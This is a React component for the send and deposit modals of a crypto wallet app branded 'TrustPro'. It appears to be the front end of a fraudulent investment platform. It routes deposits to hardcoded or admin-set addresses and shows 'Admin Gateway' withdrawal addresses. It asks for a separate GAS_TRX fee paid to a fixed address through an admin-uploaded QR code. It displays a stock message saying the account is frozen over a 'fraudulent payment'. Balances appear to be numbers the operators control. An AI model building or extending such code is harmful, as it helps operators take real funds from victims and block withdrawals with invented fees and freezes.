import React, { useState } from 'react';
import { useWallet, getUserReceiveAddress } from '../context/WalletContext';
import {
  X,
  Send,
  Download,
  Copy,
  Check,
  QrCode,
  AlertCircle,
  Zap,
  CheckCircle2,
  Clock,
  Layers,
} from 'lucide-react';

export const SendReceiveModal: React.FC = () => {
  const {
    isSendModalOpen,
    setIsSendModalOpen,
    isReceiveModalOpen,
    setIsReceiveModalOpen,
    selectedAssetForModal,
    setSelectedAssetForModal,
    assets,
    currentUser,
    sendCrypto,
    depositCrypto,
    depositAddresses,
    withdrawAddresses,
    networkFeeQrCode,
  } = useWallet();

  const [toAddress, setToAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [depositAmount, setDepositAmount] = useState('');
  const [customTxHash, setCustomTxHash] = useState('');
  const [feeSpeed, setFeeSpeed] = useState<'slow' | 'standard' | 'fast'>('standard');
  const [copied, setCopied] = useState(false);
  const [txResult, setTxResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);
  const [depositResult, setDepositResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);

  const activeAsset = selectedAssetForModal || assets[0];
  const userBalance = currentUser?.balances[activeAsset.symbol] || 0;
  const numAmount = parseFloat(amount) || 0;
  const amountUsd = numAmount * activeAsset.priceUsd;

  // Selected Network for Send or Receive
  const [selectedNetwork, setSelectedNetwork] = useState<string>('TRC-20');

  // Multi-network options based on selected coin
  const getNetworkOptions = (symbol: string) => {
    const sym = symbol.toUpperCase();
    if (sym === 'USDT' || sym === 'USDC') {
      return ['TRC-20', 'ERC-20', 'BEP-20', 'Solana SPL', 'Polygon'];
    }
    if (sym === 'BTC') {
      return ['Bitcoin Native', 'BEP-20', 'ERC-20 (WBTC)'];
    }
    if (sym === 'ETH') {
      return ['ERC-20', 'BEP-20', 'Arbitrum One', 'Optimism'];
    }
    if (sym === 'BNB') {
      return ['BEP-20', 'BEP-2'];
    }
    if (sym === 'SOL') {
      return ['Solana SPL'];
    }
    if (sym === 'TRX') {
      return ['TRC-20'];
    }
    return ['TRC-20', 'ERC-20', 'BEP-20'];
  };

  const networkList = getNetworkOptions(activeAsset.symbol);
  const currentActiveNetwork = networkList.includes(selectedNetwork) ? selectedNetwork : networkList[0];

  const currentDepositAddress = activeAsset.symbol === 'GAS_TRX'
    ? depositAddresses['GAS_TRX'] || 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6'
    : (currentUser
      ? getUserReceiveAddress(currentUser, activeAsset.symbol, currentActiveNetwork)
      : depositAddresses[activeAsset.symbol] ||
        depositAddresses.DEFAULT ||
        '0x71C7656EC7ab88b098defB751B7401B5f6d8976F');

  const handleSendSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentUser?.isFrozen) {
      setTxResult({
        success: false,
        message: 'Your account is frozen due to verification of a fraudulent payment. Contact TrustPro Support.',
      });
      return;
    }
    if (!toAddress || numAmount <= 0) return;

    const res = sendCrypto(activeAsset.symbol, numAmount, toAddress, currentActiveNetwork);
    setTxResult(res);

    if (res.success) {
      setTimeout(() => {
        setIsSendModalOpen(false);
        setTxResult(null);
        setAmount('');
        setToAddress('');
      }, 2500);
    }
  };

  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const depNum = parseFloat(depositAmount);
    if (!depNum || depNum <= 0) return;

    const res = depositCrypto(activeAsset.symbol, depNum, customTxHash || undefined, undefined, currentActiveNetwork);
    setDepositResult(res);

    if (res.success) {
      setTimeout(() => {
        setIsReceiveModalOpen(false);
        setDepositResult(null);
        setDepositAmount('');
        setCustomTxHash('');
      }, 2500);
    }
  };

  const handleCopyReceiveAddress = () => {
    navigator.clipboard.writeText(currentDepositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!isSendModalOpen && !isReceiveModalOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fadeIn">
      {/* SEND MODAL */}
      {isSendModalOpen && (
        <div className="relative w-full max-w-md rounded-3xl bg-[#0e1015] border border-slate-800 p-6 shadow-2xl">
          <button
            onClick={() => {
              setIsSendModalOpen(false);
              setTxResult(null);
            }}
            className="absolute top-4 right-4 h-8 w-8 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white"
            id="close-send-modal"
          >
            <X className="h-4 w-4" />
          </button>

          <div className="flex items-center gap-3 mb-4">
            <div className="h-10 w-10 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400">
              <Send className="h-5 w-5" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-white">Send Crypto</h3>
              <p className="text-xs text-slate-400">Transfer tokens across verified networks</p>
            </div>
          </div>

          {/* Processing Time Notice */}
          <div className="mb-4 rounded-2xl bg-blue-300/10 border border-blue-300/30 p-3 text-left flex items-start gap-2.5">
            <Clock className="h-4 w-4 text-blue-300 shrink-0 mt-0.5" />
            <div>
              <p className="text-[11px] font-bold text-blue-300">Processing Protocol Notice</p>
              <p className="text-[10px] text-blue-300/90 leading-relaxed mt-0.5">
                On-Chain Security Verification: Direct protocol transfers process instantly. External network withdrawals take <strong>30 minutes to 24 hours</strong> with active multi-node confirmation timer.
              </p>
            </div>
          </div>

          {txResult ? (
            <div className="text-center py-6">
              {txResult.success ? (
                <>
                  <CheckCircle2 className="h-14 w-14 text-emerald-400 mx-auto mb-3 animate-bounce" />
                  <h4 className="text-lg font-bold text-white">Transfer Initiated!</h4>
                  <p className="text-xs text-slate-400 mt-1">{txResult.message}</p>
                  <p className="text-[10px] font-mono text-emerald-400 mt-2 truncate">Tx: {txResult.txHash}</p>
                </>
              ) : (
                <>
                  <AlertCircle className="h-14 w-14 text-rose-400 mx-auto mb-3" />
                  <h4 className="text-lg font-bold text-white">Transfer Failed</h4>
                  <p className="text-xs text-rose-400 mt-1">{txResult.message}</p>
                </>
              )}
            </div>
          ) : (
            <form onSubmit={handleSendSubmit} className="space-y-4">
              {/* Asset Selector */}
              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">Select Asset</label>
                <select
                  value={activeAsset.symbol}
                  onChange={(e) => {
                    const found = assets.find((a) => a.symbol === e.target.value);
                    if (found) setSelectedAssetForModal(found);
                  }}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500"
                >
                  {assets.map((a) => (
                    <option key={a.id} value={a.symbol}>
                      {a.name} ({a.symbol}) — Bal: {currentUser?.balances[a.symbol] || 0}
                    </option>
                  ))}
                </select>
              </div>

              {/* Network Standard Option */}
              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1 flex items-center gap-1">
                  <Layers className="h-3 w-3 text-emerald-400" />
                  <span>Choose Transfer Network Standard</span>
                </label>
                <div className="grid grid-cols-3 gap-1.5">
                  {networkList.map((net) => (
                    <button
                      key={net}
                      type="button"
                      onClick={() => setSelectedNetwork(net)}
                      className={`px-2.5 py-2 rounded-xl text-xs font-bold transition-all border ${
                        currentActiveNetwork === net
                          ? 'bg-emerald-500 text-black border-emerald-400 shadow-md shadow-emerald-500/20'
                          : 'bg-slate-950 text-slate-400 border-slate-800 hover:text-white'
                      }`}
                    >
                      {net}
                    </button>
                  ))}
                </div>
              </div>

              {/* Address Input */}
              <div>
                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-400 mb-1">
                  <span>Recipient Address ({currentActiveNetwork})</span>
                  {withdrawAddresses[activeAsset.symbol] && (
                    <span className="text-[10px] text-blue-300 font-mono">
                      Admin Gateway: {withdrawAddresses[activeAsset.symbol].slice(0, 8)}...
                    </span>
                  )}
                </div>
                <input
                  type="text"
                  placeholder={`Paste recipient ${activeAsset.symbol} (${currentActiveNetwork}) address...`}
                  value={toAddress}
                  onChange={(e) => setToAddress(e.target.value)}
                  required
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                />
                {withdrawAddresses[activeAsset.symbol] && (
                  <p className="text-[10px] text-slate-400 mt-1">
                    Protocol Withdrawal Gateway: <span className="font-mono text-blue-300">{withdrawAddresses[activeAsset.symbol]}</span>
                  </p>
                )}
              </div>

              {/* Amount Input */}
              <div>
                <div className="flex justify-between text-[11px] font-semibold text-slate-400 mb-1">
                  <span>Amount</span>
                  <button
                    type="button"
                    onClick={() => setAmount(userBalance.toString())}
                    className="text-emerald-400 font-bold hover:underline"
                  >
                    MAX: {userBalance} {activeAsset.symbol}
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="number"
                    step="any"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    required
                    className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2.5 text-sm font-mono text-white focus:outline-none focus:border-emerald-500"
                  />
                  <span className="absolute right-3 top-3 text-xs text-slate-500 font-bold">
                    ≈ ${amountUsd.toFixed(2)}
                  </span>
                </div>
              </div>

              {/* Gas Speed Tiers */}
              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">Gas Network Speed</label>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { id: 'slow', label: 'Slow', fee: '$0.50' },
                    { id: 'standard', label: 'Standard', fee: '$1.25' },
                    { id: 'fast', label: 'Fast', fee: '$3.00' },
                  ].map((tier) => (
                    <button
                      key={tier.id}
                      type="button"
                      onClick={() => setFeeSpeed(tier.id as any)}
                      className={`p-2 rounded-xl text-center border text-xs transition-all ${
                        feeSpeed === tier.id
                          ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400 font-bold'
                          : 'border-slate-800 bg-slate-950 text-slate-400'
                      }`}
                    >
                      <p className="font-semibold">{tier.label}</p>
                      <p className="text-[10px] font-mono text-slate-500">{tier.fee}</p>
                    </button>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                className="w-full rounded-xl bg-emerald-500 py-3 text-xs font-bold text-black hover:bg-emerald-400 transition-all shadow-lg"
                id="submit-send-crypto-btn"
              >
                Confirm & Send {numAmount > 0 ? `${numAmount} ${activeAsset.symbol}` : ''}
              </button>
            </form>
          )}
        </div>
      )}

      {/* RECEIVE / DEPOSIT MODAL */}
      {isReceiveModalOpen && (
        <div className="relative w-full max-w-md rounded-3xl bg-[#0e1015] border border-slate-800 p-6 shadow-2xl text-center max-h-[90vh] overflow-y-auto">
          <button
            onClick={() => {
              setIsReceiveModalOpen(false);
              setDepositResult(null);
            }}
            className="absolute top-4 right-4 h-8 w-8 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 hover:text-white z-10"
            id="close-receive-modal"
          >
            <X className="h-4 w-4" />
          </button>

          <div className="mx-auto h-12 w-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 mb-2">
            <Download className="h-6 w-6" />
          </div>
          <h3 className="text-lg font-bold text-white">Deposit Crypto</h3>
          <p className="text-xs text-slate-400 mb-3">Select coin, network, and copy your real vault address</p>

          {/* Deposit Settlement Notice */}
          <div className="mb-4 rounded-2xl bg-blue-300/10 border border-blue-300/30 p-3 text-left flex items-start gap-2.5">
            <Clock className="h-4 w-4 text-blue-300 shrink-0 mt-0.5" />
            <div>
              <p className="text-[11px] font-bold text-blue-300">Deposit Settlement Protocol</p>
              <p className="text-[10px] text-blue-200/90 leading-relaxed mt-0.5">
                On-chain deposits undergo multi-node validation. Verification time ranges from <strong>30 minutes to 24 hours</strong> based on block confirmations.
              </p>
            </div>
          </div>

          {/* Coin Selector */}
          {activeAsset.symbol !== 'GAS_TRX' && (
            <div className="mb-3">
              <label className="block text-[10px] font-bold text-slate-400 text-left mb-1">Select Coin</label>
              <select
                value={activeAsset.symbol}
                onChange={(e) => {
                  const found = assets.find((a) => a.symbol === e.target.value);
                  if (found) setSelectedAssetForModal(found);
                }}
                className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 text-center font-bold"
              >
                {assets.map((a) => (
                  <option key={a.id} value={a.symbol}>
                    {a.name} ({a.symbol})
                  </option>
                ))}
              </select>
            </div>
          )}

          {/* Choose Network Standard */}
          {activeAsset.symbol !== 'GAS_TRX' && (
            <div className="mb-4 text-left">
              <label className="block text-[11px] font-semibold text-slate-400 mb-1 flex items-center gap-1">
                <Layers className="h-3 w-3 text-emerald-400" />
                <span>Select Deposit Network Option</span>
              </label>
              <div className="grid grid-cols-3 gap-1.5">
                {networkList.map((net) => (
                  <button
                    key={net}
                    type="button"
                    onClick={() => setSelectedNetwork(net)}
                    className={`px-2.5 py-1.5 rounded-xl text-xs font-bold transition-all border ${
                      currentActiveNetwork === net
                        ? 'bg-emerald-500 text-black border-emerald-400 shadow-md shadow-emerald-500/20'
                        : 'bg-slate-950 text-slate-400 border-slate-800 hover:text-white'
                    }`}
                  >
                    {net}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* QR Code */}
          <div className="mx-auto my-3 w-44 h-44 rounded-2xl bg-white p-2 flex flex-col items-center justify-center border-4 border-emerald-500/20 shadow-inner overflow-hidden">
            <img
              src={
                activeAsset.symbol === 'GAS_TRX' && networkFeeQrCode
                  ? networkFeeQrCode
                  : `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
                      currentDepositAddress
                    )}`
              }
              alt="Deposit QR Code"
              className="h-32 w-32 object-contain"
              referrerPolicy="no-referrer"
            />
            <span className="text-[10px] font-mono font-bold text-black mt-1 uppercase">
              {activeAsset.symbol} ({currentActiveNetwork})
            </span>
          </div>

          <p className="text-xs text-slate-400 font-medium mb-1 text-left">
            Your {activeAsset.symbol} Deposit Address ({currentActiveNetwork}):
          </p>
          <div className="flex items-center justify-between rounded-xl bg-slate-950 border border-slate-800 p-2.5 mb-3">
            <span className="font-mono text-xs text-emerald-400 truncate">
              {currentDepositAddress}
            </span>
            <button
              onClick={handleCopyReceiveAddress}
              className="p-1.5 rounded-lg bg-slate-800 text-slate-200 hover:text-white shrink-0 ml-2"
              title="Copy Deposit Address"
              id="copy-deposit-addr-btn"
            >
              {copied ? <Check className="h-4 w-4 text-emerald-400" /> : <Copy className="h-4 w-4" />}
            </button>
          </div>

          {depositResult ? (
            <div className="py-4 text-center rounded-2xl bg-slate-950 border border-emerald-500/30 p-4">
              <CheckCircle2 className="h-10 w-10 text-emerald-400 mx-auto mb-2 animate-bounce" />
              <h4 className="text-sm font-bold text-white">Deposit Request Logged!</h4>
              <p className="text-xs text-slate-300 mt-1">{depositResult.message}</p>
              <p className="text-[10px] font-mono text-emerald-400 mt-2 truncate">Tx: {depositResult.txHash}</p>
            </div>
          ) : (
            <form onSubmit={handleDepositSubmit} className="space-y-3 border-t border-slate-800/80 pt-4 text-left">
              <p className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                <Zap className="h-3.5 w-3.5 text-emerald-400" />
                <span>Submit Deposit Notification</span>
              </p>

              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">
                  Deposit Amount ({activeAsset.symbol})
                </label>
                <input
                  type="number"
                  step="any"
                  placeholder={`Amount in ${activeAsset.symbol}...`}
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  required
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                />
              </div>

              <div>
                <label className="block text-[11px] font-semibold text-slate-400 mb-1">Tx Hash / Proof (Optional)</label>
                <input
                  type="text"
                  placeholder="Paste transaction hash if available..."
                  value={customTxHash}
                  onChange={(e) => setCustomTxHash(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                />
              </div>

              <button
                type="submit"
                className="w-full rounded-xl bg-emerald-500 py-2.5 text-xs font-bold text-black hover:bg-emerald-400 transition-all shadow-md shadow-emerald-500/20"
                id="submit-deposit-btn"
              >
                Submit Deposit Request
              </button>
            </form>
          )}

          <div className="mt-4 rounded-xl bg-blue-300/10 border border-blue-300/20 p-2.5 text-left text-[11px] text-blue-300">
            Send only <strong className="text-white">{activeAsset.symbol}</strong> via <strong className="text-white">{currentActiveNetwork}</strong> to this address.
          </div>
        </div>
      )}
    </div>
  );
};
